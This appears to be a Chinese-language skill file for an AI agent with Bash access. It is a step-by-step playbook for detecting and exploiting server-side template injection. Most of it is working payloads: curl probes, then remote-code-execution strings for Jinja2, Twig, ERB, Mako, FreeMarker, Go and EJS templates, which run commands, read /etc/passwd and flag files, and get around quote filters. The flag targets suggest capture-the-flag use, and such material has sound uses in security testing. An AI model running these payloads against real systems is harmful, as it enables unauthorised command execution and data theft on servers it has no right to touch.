---
name: ssti
description: 服务器端模板注入漏洞检测与利用。当目标存在模板渲染功能时使用，包括 Jinja2、Twig、FreeMarker、ERB 等模板引擎。
allowed-tools: Bash, Read, Write
---

# 服务器端模板注入 (SSTI)

通过在模板中注入恶意表达式，执行任意代码。

## 决策策略

### 三层推理
- **fact**: 直接观察到的行为（模板表达式是否被解析）
- **hypothesis**: 猜测（未经证实）
- **decision**: 下一步行动

### 最短探针原则
先确认假设，再深入攻击。SSTI 最短探针顺序：
1. `{{7*7}}` 或 `${7*7}` → 确认模板是否解析
2. `{{config}}` 或 `${T(config)}` → 读取配置
3. 再尝试代码执行 `{{().__class__.__bases__[0]}}`

### 切换规则
payload 无效果时：
- 尝试不同模板语法（{{}}, ${}, <%= %>）
- 尝试读取源码找模板引擎类型
- 尝试沙箱逃逸 payload
- 尝试写入文件或 RCE

## 常见指示器

- 模板渲染功能（name={{name}}, message=${message}）
- 用户输入直接拼接到模板中
- 错误信息暴露模板引擎
- Markdown 或模板预览功能

## 检测方法

### 基础测试

```bash
# 基础检测
curl "http://target.com/page?name={{7*7}}"
curl "http://target.com/page?name=${7*7}"
curl "http://target.com/page?name=<%= 7*7 %>"
```

## 攻击向量

### Jinja2 (Python)

```python
# 检测
{{7*7}}

# 读取配置
{{config}}
{{config.items()}}

# RCE payload
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 无引号 RCE
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)

```twig
{# 检测 #}
{{7*7}}
{{7*'7'}} {# 返回 7777777 (Twig 重复), Jinja2 返回 49 #}

{# 文件读取 #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE (Twig 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE (Twig 3.x via filter) #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

### ERB (Ruby)

```ruby
# 检测
<%= 7*7 %>

# 读取文件
<%= File.read('/etc/passwd') %>

# 命令执行
<%= system('cat /flag.txt') %>
<%= `cat /flag.txt` %>
```

### Mako (Python)

```python
# 检测
${7*7}

# RCE
<%
  import os
  os.popen("id").read()
%>

# One-liner
${__import__('os').popen('cat /flag.txt').read()}
```

### FreeMarker (Java)

```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Go Template

```go
{{.ReadFile "/flag.txt"}}
```

### EJS (JavaScript)

```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

## SSTI 绕过技术

### 引号过滤绕过 via __dict__.update()

当引号被过滤时，使用 Python 关键字参数：

```python
# 绕过引号过滤
{{player.__dict__.update(power_level=9999999) or player.name}}
```

### Django 过滤器绕过

```python
# 无引号读取 config
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os')}}
```

## 最佳实践

1. 先用 `{{7*7}}` 检测是否返回 49
2. 如果返回 7777777 是 Twig
3. 测试读取文件：`{{Config}}`, `{{config}}`, `{{.Config}}`
4. 测试命令执行：RCE payload
5. 注意绕过引号过滤
6. 检查模板文档获取更多 payload
